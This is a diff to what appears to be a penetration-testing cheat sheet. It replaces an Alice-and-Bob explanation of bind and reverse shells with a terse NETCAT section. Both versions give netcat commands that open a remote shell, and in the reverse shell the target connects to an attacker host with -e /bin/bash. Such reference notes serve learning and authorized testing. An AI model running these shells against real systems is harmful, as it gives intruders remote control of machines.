@@ -26,29 +26,17 @@ whatweb http://<IP>:<PORT> -a 4
 webtech -u <IP>
 ```
 
----
+# NETCAT
+```
+# BIND SHELL
+[TARGET] > nc -nlvp $LPORT -e cmd.exe    # WINDOWS
+[TARGET] > nc -nlvp $LPORT -e /bin/sh    # LINUX
+[ATTACK] > nc -nv $RHOST $RPORT
 
-<b>Extract link from html page:</b>
-
-	cat index.html | grep "href=" | cut -d "/" -f3| grep "<[DOMAIN]>" | cut -d '"' -f1 | sort -u
-
-# Bind vs Reverse Shell
-
-<b>Bind Shell:</b>
-
-Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:
-
-	(BOB): nc -nlvp <[PORT]> -e cmd.exe
-
-	(ALICE): nc -nv <[BOB_IP]> <[PORT]>
-
-<b>Reverse Shell:</b>
-
-Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:
-
-	(ALICE): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash
-
-	(BOB): nc -nlvp <[PORT]>
+# REVERSE SHELL
+[ATTACK] > nc -nlvp $LPORT
+[TARGET] > nc -nv $LHOST $LPORT -e /bin/bash
+```
 
 # Zone Transfer
 
